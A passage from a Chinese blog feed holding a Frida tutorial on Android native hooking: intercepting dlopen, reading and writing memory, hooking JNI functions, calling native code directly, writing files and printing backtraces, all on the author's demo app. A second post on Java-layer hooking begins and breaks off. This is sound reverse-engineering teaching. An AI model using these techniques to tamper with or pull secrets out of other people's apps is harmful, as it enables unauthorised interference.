src="https://cdn.nlark.com/yuque/0/2024/gif/2167914/1709718183086-ecca6edf-a363-4ef8-a2d2-66c0a9c419b5.gif" alt="img">****</p><h1 id="0x08-Hook-so加载（dlopen）"><a href="#0x08-Hook-so加载（dlopen）" class="headerlink" title="0x08 Hook so加载（dlopen）"></a>0x08 Hook so加载（dlopen）</h1><p>当遇到“等so加载完后进行某Hook操作时”，可以Hook dlopen（有的是android_dlopen_ext）方法来确定so的加载。PS：不推荐Hook System.loadLibrary()，因为加载so的方式并不止这一种，而且最终都会调用 **dlopen()**。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookDlopen</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> dlopenAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;dlopen&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (dlopenAddr) &#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(dlopenAddr, &#123;</span><br><span class="line">            <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123; <span class="comment">// dlopen(const char* filename, int flags)</span></span><br><span class="line">                <span class="keyword">let</span> soName = args[<span class="number">0</span>].<span class="title function_">readCString</span>(); <span class="comment">// &quot;/data/app/com.zyc.fridasodemo-1/lib/x86/libnative-lib.so&quot;</span></span><br><span class="line">                <span class="keyword">if</span> (soName.<span class="title function_">indexOf</span>(<span class="string">&quot;libnative-lib.so&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;成功加载到了--&gt;&quot;</span> + soName);</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">hasloaded</span> = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123; <span class="comment">//onLeave()中才是dlopen()加载完成后</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">hasloaded</span>) &#123;</span><br><span class="line">                    <span class="title function_">hooImEx</span>(); <span class="comment">// 等so加载完成就执行导入/导出函数打印</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行，点击按钮导致so加载，Hook到加载触发导入&#x2F;导出函数打印：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171014507.gif" alt="img"> </p><h1 id="0x09-读写内存"><a href="#0x09-读写内存" class="headerlink" title="0x09 读写内存"></a>0x09 读写内存</h1><p>通过内存地址我们可以直接操作内存数据，以下面字符串为例，这是用例中print()返回的字符串：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171014490.jpeg" alt="img"> </p><p>直接Hook操作这段内存修改：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookMem</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> soAddress = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;so基址：&quot;</span> + soAddress);</span><br><span class="line">    <span class="keyword">if</span> (soAddress) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;读取...&quot;</span>);</span><br><span class="line">        <span class="keyword">const</span> strAddress = soAddress.<span class="title function_">add</span>(<span class="number">0x0D40</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;打印这段字符串：&quot;</span> + strAddress.<span class="title function_">readCString</span>());</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;读16字节：&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(strAddress.<span class="title function_">readByteArray</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;写入...&quot;</span>);</span><br><span class="line">        <span class="title class_">Memory</span>.<span class="title function_">protect</span>(strAddress, <span class="title class_">Process</span>.<span class="property">pageSize</span>, <span class="string">&quot;rw-&quot;</span>); <span class="comment">//修改内存页属性后再写入，不然可能报access violation accessing</span></span><br><span class="line">        strAddress.<span class="title function_">writeUtf8String</span>(<span class="string">&quot;123&quot;</span>) <span class="comment">//内存写入字符串,该方法末尾会自动添加&#x27;\0&#x27;</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\r\n打印这段字符串：&quot;</span> + strAddress.<span class="title function_">readCString</span>());</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;读16字节：\r\n&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(strAddress.<span class="title function_">readByteArray</span>(<span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171016670.gif" alt="img"> </p><p>也可以按照字节修改：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strAddress.writeByteArray([0x41,0x41,0x41]);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171016295.jpeg" alt="img"> </p><h1 id="0x10-Hook-JNI函数"><a href="#0x10-Hook-JNI函数" class="headerlink" title="0x10 Hook JNI函数"></a>0x10 Hook JNI函数</h1><p>很多时候我们需要通过hook JNI函数来达到目的，比如Hook RegisterNatives()拿到动态注册的函数，或是NewStringUTF()查看加解密字符串的构建等，实现JNI的hook可以使用下面两种方法：</p><p>偏移计算：拿到JNIEnv结构体的地址，加上函数在结构体中的偏移即可。</p><p>libart.so：从libart.so中遍历出要找到的JNINativeMethod。</p><h2 id="通过偏移计算"><a href="#通过偏移计算" class="headerlink" title="通过偏移计算"></a>通过偏移计算</h2><p>首先把jni.h中JNINativeInterface结构体声明格式化成单行形式（<a href="https://download.csdn.net/download/zyc3545/15746526">点此下载</a>），如果要hook NewStringUTF()，从文件中找到其在168行 ：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171018799.jpeg" alt="img"> </p><p>则其偏移地址为 <strong>env指向地址 + (168-1) x 指针大小</strong> ，以此写出：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookJni</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="comment">//这样才能取到env，否则为null</span></span><br><span class="line">        <span class="keyword">const</span> envAddr = <span class="title function_">ptr</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>().<span class="property">handle</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;env地址：&quot;</span> + envAddr);</span><br><span class="line">        <span class="keyword">const</span> envPointAddr = envAddr.<span class="title function_">readPointer</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;env指向地址：&quot;</span> + envPointAddr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> envPointAddr168 = envPointAddr.<span class="title function_">add</span>((<span class="number">168</span> - <span class="number">1</span>) * <span class="title class_">Process</span>.<span class="property">pointerSize</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;env偏移168地址：&quot;</span> + envPointAddr168);</span><br><span class="line">        <span class="keyword">const</span> newStringUtfAddr = envPointAddr168.<span class="title function_">readPointer</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;jni函数newStringUtf地址：&quot;</span> + newStringUtfAddr);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(newStringUtfAddr, &#123;</span><br><span class="line">            <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;附加到newStringUtf函数...&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">let</span> arg1 = args[<span class="number">1</span>].<span class="title function_">readCString</span>();</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;NewStringUTF的args[1]:&quot;</span> + arg1);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;附加到newStringUtf函数返回...&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">let</span> ret = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUtfChars</span>(retval, <span class="literal">null</span>).<span class="title function_">readCString</span>();</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;返回值:&quot;</span> + ret);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171019558.gif" alt="img"> </p><h2 id="通过libart-so"><a href="#通过libart-so" class="headerlink" title="通过libart.so"></a>通过libart.so</h2><p>使用 <strong>Module.enumerateSymbols()</strong> 遍历JNI 函数，假设我们要hook RegisterNatives()：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* typedef struct &#123;</span></span><br><span class="line"><span class="comment">*    const char* name;</span></span><br><span class="line"><span class="comment">*     const char* signature;</span></span><br><span class="line"><span class="comment">*     void*       fnPtr;</span></span><br><span class="line"><span class="comment">* &#125; JNINativeMethod;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookJniByArtSym</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> artSymbol = <span class="title class_">Module</span>.<span class="title function_">enumerateSymbols</span>(<span class="string">&quot;libart.so&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (artSymbol) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; artSymbol.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">const</span> element = artSymbol[i];</span><br><span class="line">            <span class="keyword">if</span> (element.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;RegisterNatives&quot;</span>) != -<span class="number">1</span>) &#123; <span class="comment">//函数名有干扰字符，所以用indexOf而不是==，同时要排除CheckJNI函数</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;拿到了函数:&quot;</span> + element.<span class="property">name</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;函数地址:&quot;</span> + element.<span class="property">address</span>);</span><br><span class="line"></span><br><span class="line">                <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(element.<span class="property">address</span>, &#123;</span><br><span class="line">                    <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;附加到RegisterNatives()...&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">let</span> <span class="title class_">JNINativeMethod</span> = args[<span class="number">2</span>]; <span class="comment">// jstring print_Dynamic(JNIEnv *env, jclass clazz, jstring a)</span></span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;动态注册的函数名称:&quot;</span> + <span class="title class_">JNINativeMethod</span>.<span class="title function_">readPointer</span>().<span class="title function_">readCString</span>());</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;动态注册的函数签名:&quot;</span> + <span class="title class_">JNINativeMethod</span>.<span class="title function_">add</span>(<span class="title class_">Process</span>.<span class="property">pointerSize</span>).<span class="title function_">readPointer</span>().<span class="title function_">readCString</span>());</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;动态注册的函数地址:&quot;</span> + <span class="title class_">JNINativeMethod</span>.<span class="title function_">add</span>(<span class="title class_">Process</span>.<span class="property">pointerSize</span>*<span class="number">2</span>).<span class="title function_">readPointer</span>().<span class="title function_">readCString</span>());</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123; &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行发现 <strong>Module.enumerateSymbols()</strong> 一直获取不到值，查看官网才知道：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171019662.jpeg" alt="img"> </p><p>换个环境来运行就OK了：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171019706.gif" alt="img"> </p><h1 id="0x11-主动调用"><a href="#0x11-主动调用" class="headerlink" title="0x11 主动调用"></a>0x11 主动调用</h1><p>主动调用<a href="https://so.csdn.net/so/search?q=Native&spm=1001.2101.3001.7020">Native</a>函数需要用到 NativeFunction(address, returnType, argTypes[, abi]) ，其中returnType类型如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void</span><br><span class="line">pointer</span><br><span class="line">int</span><br><span class="line">uint</span><br><span class="line">long</span><br><span class="line">ulong</span><br><span class="line">char</span><br><span class="line">uchar</span><br><span class="line">size_t</span><br><span class="line">ssize_t</span><br><span class="line">float</span><br><span class="line">double</span><br><span class="line">int8</span><br><span class="line">uint8</span><br><span class="line">int16</span><br><span class="line">uint16</span><br><span class="line">int32</span><br><span class="line">uint32</span><br><span class="line">int64</span><br><span class="line">uint64</span><br><span class="line">bool</span><br></pre></td></tr></table></figure><p>写一个测试函数方便frida调用：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">jstring <span class="title function_">go</span><span class="params">(JNIEnv *env,jstring a)</span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *str1 = <span class="string">&quot;Hello c++ &quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *str2 = env-&gt;GetStringUTFChars(a,<span class="number">0</span>);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> * ret = (<span class="built_in">std</span>::<span class="built_in">string</span>(str1) + <span class="built_in">std</span>::<span class="built_in">string</span>(str2)).c_str();</span><br><span class="line">    LOGE(<span class="string">&quot;go %s&quot;</span>,ret);</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过函数地址和签名构建 <strong>NativeFunction</strong> ：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookForward</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">        <span class="keyword">const</span> methodAddr = soAddr.<span class="title function_">add</span>(<span class="number">0x9540</span>); <span class="comment">//ida静态分析查看到go()偏移0x9540</span></span><br><span class="line">        <span class="keyword">if</span> (methodAddr) &#123;</span><br><span class="line">            <span class="keyword">const</span> fun = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(methodAddr, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]); <span class="comment">//jstring , env* 都是pointer</span></span><br><span class="line">            <span class="keyword">const</span> env = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>();</span><br><span class="line">            <span class="keyword">let</span> jstr = env.<span class="title function_">newStringUtf</span>(<span class="string">&quot;zyc zyc&quot;</span>);</span><br><span class="line">            <span class="keyword">let</span> ret = <span class="title function_">fun</span>(env, jstr);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;返回值:&quot;</span>, env.<span class="title function_">getStringUtfChars</span>(ret, <span class="literal">null</span>).<span class="title function_">readCString</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171024753.gif" alt="img"> </p><h1 id="0x12-写入文件"><a href="#0x12-写入文件" class="headerlink" title="0x12 写入文件"></a>0x12 写入文件</h1><p>写入文件其实就是主动调用 <strong>libc.so</strong> 中文件操作相关函数（记得留意apk的读写权限）：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *<span class="title function_">fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fputs</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, FILE *stream)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fclose</span><span class="params">(FILE *stream)</span></span><br></pre></td></tr></table></figure><p>Hook代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookWriteFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//拿到文件相关函数地址</span></span><br><span class="line">    <span class="keyword">const</span> addr_fopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> addr_fputs = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fputs&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> addr_fclose = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fclose&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr_fopen &amp;&amp; addr_fputs &amp;&amp; addr_fclose) &#123;</span><br><span class="line">        <span class="comment">//通过地址构建函数</span></span><br><span class="line">        <span class="keyword">const</span> fopen = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr_fopen, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">        <span class="keyword">const</span> fputs = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr_fputs, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">        <span class="keyword">const</span> fclose = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr_fclose, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打开文件</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;打开文件...&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> filename = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;/data/local/tmp/zyc.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> open_mode = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;w&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> file = <span class="title function_">fopen</span>(filename, open_mode);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//写入内容</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;写入内容...&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> content = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;zyc zyc\n&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> retval = <span class="title function_">fputs</span>(content, file);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//关闭文件</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;关闭文件...&quot;</span>);</span><br><span class="line">        <span class="title function_">fclose</span>(file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171024282.jpeg" alt="img"> </p><h1 id="0x13-打印堆栈"><a href="#0x13-打印堆栈" class="headerlink" title="0x13 打印堆栈"></a>0x13 打印堆栈</h1><p>Native中增加几个函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">c</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">b</span><span class="params">()</span> &#123; c(); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">a</span><span class="params">()</span> &#123; b(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT jstring JNICALL</span><br><span class="line"><span class="title function_">Java_com_zyc_fridasodemo_Calc_print</span><span class="params">(JNIEnv *env, jclass clazz)</span> &#123;</span><br><span class="line">    a();</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>onEnter()使用 <strong>Thread.backtrace()</strong> 获取堆栈信息：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookBacktrace</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> address = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>, <span class="string">&quot;_Z1cv&quot;</span>); <span class="comment">//内存中 c() -- _Z1cv()</span></span><br><span class="line">    <span class="keyword">if</span> (address) &#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(address, &#123;</span><br><span class="line">            <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123; </span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;c() called from:\n&#x27;</span> + </span><br><span class="line">                <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(<span class="variable language_">this</span>.<span class="property">context</span>, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>)</span><br><span class="line">                .<span class="title function_">map</span>(<span class="title class_">DebugSymbol</span>.<span class="property">fromAddress</span>).<span class="title function_">join</span>(<span class="string">&#x27;\n&#x27;</span>) + <span class="string">&#x27;\n&#x27;</span>); <span class="comment">//map与join用于格式化</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123;&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行，然后hook print()函数</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171032107.jpeg" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida </tag>
            
            <tag> hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frida Java层hook</title>
      <link href="/2024/07/14/frida%20Java%E5%B1%82hook/"/>
      <url>/2024/07/14/frida%20Java%E5%B1%82hook/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x00-测试用例"><a href="#0x00-测试用例" class="headerlink" title="0x00 测试用例"></a>0x00 测试用例</h1><p>本次的hook代码都用 python接口方式 书写。首先写一个简单的程序用来测试。后续的测试就在这个程序上小修小改，不做赘述。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">    xmlns:tools=&quot;http://schemas.android.com/tools&quot;</span><br><span class="line">    android:id=&quot;@+id/layout_main&quot;</span><br><span class="line">    android:layout_width=&quot;match_parent&quot;</span><br><span class="line">    android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">    android:orientation=&quot;vertical&quot;</span><br><span class="line">    tools:context=&quot;.MainActivity&quot;&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;Button</span><br><span class="line">        android:id=&quot;@+id/btn_create&quot;</span><br><span class="line">        android:layout_width=&quot;match_parent&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_weight=&quot;1&quot;</span><br><span class="line">        android:text=&quot;实例化一个Calc&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;LinearLayout</span><br><span class="line">        android:id=&quot;@+id/layout_add1&quot;</span><br><span class="line">        android:layout_width=&quot;match_parent&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_weight=&quot;1&quot;</span><br><span class="line">        android:orientation=&quot;horizontal&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;EditText</span><br><span class="line">            android:id=&quot;@+id/edt_add1&quot;</span><br><span class="line">            android:layout_width=&quot;198dp&quot;</span><br><span class="line">            android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">            android:autofillHints=&quot;&quot;</span><br><span class="line">            android:ems=&quot;5&quot;</span><br><span class="line">            android:hint=&quot;输入一个数&quot;</span><br><span class="line">            android:inputType=&quot;number&quot; /&gt;</span><br><span class="line"></span><br><span class="line">        &lt;Button</span><br><span class="line">            android:id=&quot;@+id/btn_add1&quot;</span><br><span class="line">            android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">            android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">            android:text=&quot;add1()&quot; /&gt;</span><br><span class="line">    &lt;/LinearLayout&gt;</span><br><span class="line"></span><br><span class="line">&lt;/LinearLayout&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zyc.fridademo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title class_">View</span>.OnClickListener &#123;</span><br><span class="line">    <span class="keyword">private</span> EditText edtAdd1;</span><br><span class="line">    <span class="keyword">private</span> Button btnCreate;</span><br><span class="line">    <span class="keyword">private</span> Button btnAdd1;</span><br><span class="line">    <span class="keyword">private</span> Calc calc;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        edtAdd1 = findViewById(R.id.edt_add1);</span><br><span class="line">        btnCreate = findViewById(R.id.btn_create);</span><br><span class="line">        btnCreate.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">        btnAdd1 = findViewById(R.id.btn_add1);</span><br><span class="line">        btnAdd1.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.btn_create:</span><br><span class="line">                calc = <span class="keyword">new</span> <span class="title class_">Calc</span>(<span class="number">1</span>);</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;已创建一个Calc\nbase=&quot;</span> + calc.base, Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.btn_add1:</span><br><span class="line">                <span class="type">int</span> <span class="variable">p1</span> <span class="operator">=</span> Integer.parseInt(String.valueOf(edtAdd1.getText()));</span><br><span class="line">                <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> calc.add(p1);</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;执行add(p1)\n结果=&quot;</span> + res, Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span 